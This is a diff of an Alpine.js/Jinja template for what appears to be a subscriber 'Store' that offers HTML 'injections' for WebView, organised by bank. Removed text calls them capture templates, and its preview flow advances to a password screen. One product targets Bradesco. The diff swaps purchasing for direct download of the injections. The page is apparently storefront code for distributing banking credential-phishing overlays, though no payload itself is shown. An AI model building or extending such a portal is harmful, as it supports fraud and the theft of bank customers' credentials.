@@ -4,61 +4,63 @@
 <div class="portal layout" x-data="subscriberStore()" x-init="load()">
     {% include "subscriber/_nav.html" %}
     <div class="main">
-        <header class="page-head">
+        <header class="page-head page-head--store">
             <h1>Store</h1>
-            <p>Injections HTML prontas para WebView — preview protegido, entrega após compra</p>
+            <p>Injections HTML — Facilite alguns passos de sua operação</p>
         </header>
 
         <section class="section">
-            <div class="section-head">
+            <div class="section-head section-head--store" x-show="!loading" x-cloak>
                 <h2>Catálogo</h2>
-                <p>Templates de captura por instituição</p>
             </div>
-            <div class="store-grid">
-                <template x-for="product in products" :key="product.id">
-                    <article class="store-card">
-                        <div class="store-card__preview">
-                            <div class="store-card__viewport">
-                                <iframe
-                                    class="store-card__iframe"
-                                    :src="previewUrl(product.id, true)"
-                                    title=""
-                                    tabindex="-1"
+            <div class="store-stage" :class="{ 'store-stage--booting': loading }">
+                <div class="store-loading" x-show="loading" x-cloak aria-busy="true" aria-live="polite">
+                    <span class="store-loading__spinner" aria-hidden="true"></span>
+                </div>
+                <div class="store-grid" x-show="!loading && products.length > 0" x-cloak>
+                    <template x-for="product in products" :key="product.id">
+                        <article class="store-card">
+                            <div class="store-card__preview">
+                                <img
+                                    class="store-card__thumb"
+                                    :src="product.thumb_url"
+                                    :alt="product.name"
                                     loading="eager"
-                                    sandbox="allow-scripts allow-same-origin">
-                                </iframe>
+                                    decoding="async"
+                                    @error="$el.classList.add('is-missing')">
+                                <div class="store-card__preview-mask" aria-hidden="true"></div>
                             </div>
-                            <div class="store-card__preview-mask" aria-hidden="true"></div>
-                        </div>
-                        <div class="store-card__body">
-                            <div class="store-card__meta">
-                                <span class="store-card__bank" x-text="product.bank"></span>
-                                <span class="store-card__price" x-text="product.price_display"></span>
+                            <div class="store-card__body">
+                                <div class="store-card__meta">
+                                    <span class="store-card__bank" x-text="product.bank"></span>
+                                </div>
+                                <h3 class="store-card__title" x-text="product.name"></h3>
+                                <p class="store-card__desc" x-text="product.description"></p>
+                                <div class="store-card__actions">
+                                    <button type="button" class="btn btn-ghost" @click="openPreview(product)">
+                                        <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                                            <path d="M1 8s2.8-5 7-5 7 5 7 5-2.8 5-7 5-7-5-7-5Z" stroke="currentColor" stroke-width="1.35" stroke-linejoin="round"/>
+                                            <circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.35"/>
+                                        </svg>
+                                        <span>Preview</span>
+                                    </button>
+                                    <a class="btn btn-action store-card__download"
+                                        :href="product.download_url"
+                                        :download="`${product.id}.html`"
+                                        title="Baixar injection">
+                                        <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                                            <path d="M8 3v7M5.5 10.5 8 13l2.5-2.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="square"/>
+                                            <path d="M3 13h10" stroke="currentColor" stroke-width="1.4" stroke-linecap="square"/>
+                                        </svg>
+                                        <span>Download</span>
+                                    </a>
+                                </div>
                             </div>
-                            <h3 class="store-card__title" x-text="product.name"></h3>
-                            <p class="store-card__desc" x-text="product.description"></p>
-                            <div class="store-card__actions">
-                                <button type="button" class="btn btn-ghost" @click="openPreview(product)">
-                                    <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
-                                        <path d="M1 8s2.8-5 7-5 7 5 7 5-2.8 5-7 5-7-5-7-5Z" stroke="currentColor" stroke-width="1.35" stroke-linejoin="round"/>
-                                        <circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.35"/>
-                                    </svg>
-                                    <span>Preview</span>
-                                </button>
-                                <button type="button" class="btn btn-action store-card__buy" @click="buy(product)">
-                                    <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
-                                        <path d="M1.5 1.5h1.8l1.1 5.7h7.8l1.6-4.2H4.2" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/>
-                                        <circle cx="5.8" cy="12.8" r="1" stroke="currentColor" stroke-width="1.25"/>
-                                        <circle cx="11.8" cy="12.8" r="1" stroke="currentColor" stroke-width="1.25"/>
-                                    </svg>
-                                    <span>Comprar</span>
-                                </button>
-                            </div>
-                        </div>
-                    </article>
-                </template>
+                        </article>
+                    </template>
+                </div>
+                <p class="store-empty" x-show="!loading && products.length === 0" x-cloak>Nenhum produto disponível no catálogo.</p>
             </div>
-            <p class="store-empty" x-show="products.length === 0">Nenhum produto disponível no catálogo.</p>
         </section>
     </div>
 
@@ -76,16 +78,15 @@
                 <div class="store-modal__viewport">
                     <iframe
                         class="store-modal__iframe"
-                        x-bind:src="previewOpen && previewProduct ? previewUrl(previewProduct.id, false) : 'about:blank'"
+                        x-ref="previewFrame"
+                        src="about:blank"
                         title="Preview do produto"
                         sandbox="allow-scripts allow-same-origin">
                     </iframe>
                 </div>
             </div>
-            <p class="store-modal__hint">Interaja como no dispositivo real. Ao tocar em <strong>Continuar</strong>, o fluxo avança para a tela de senha.</p>
+            <p class="store-modal__hint" x-show="previewProduct?.id !== 'BradescoAtualizacao'">Interaja como no dispositivo real. Ao tocar no preview com mouse, o fluxo avança.</p>
         </div>
     </div>
-
-    <p class="store-toast" x-show="toast" x-text="toast" x-cloak></p>
 </div>
 {% endblock %}
